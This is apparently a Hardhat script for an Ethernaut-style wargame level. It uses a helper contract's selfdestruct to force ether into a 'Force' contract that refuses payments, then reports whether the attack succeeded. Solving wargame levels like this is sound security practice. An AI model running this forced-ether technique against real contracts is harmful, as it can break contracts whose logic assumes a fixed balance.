import "@ethersproject/abstract-provider"
import { BigNumber } from "ethers";
import { deployments, ethers, getNamedAccounts } from "hardhat"


import * as dotenv from 'dotenv'
dotenv.config()


const executeExploit= async()=>{
    const {exploiter}=await getNamedAccounts()
    const exploiterAcc= await ethers.getSigner(exploiter)
    const forceAttackDeployment=await deployments.get('ForceAttack')
    const forceAttack = await ethers.getContractAt('ForceAttack',forceAttackDeployment.address)
    const force= await ethers.getContractAt('Force',process.env.FORCE_ADDRESS as string)

    const tx=await forceAttack.connect(exploiterAcc).destructAndSendEther(force.address,{
        value:1,
        gasPrice: (await ethers.provider.getGasPrice()).mul(3)
    })
    await tx.wait()

    if(((await ethers.provider.getBalance(force.address)) as BigNumber).gt(0)){
        console.log("Successful attack")
    }else{
        console.log("Attack failed")
    }

}

executeExploit().then(()=>process.exit(0)).catch(err=>console.log(err))
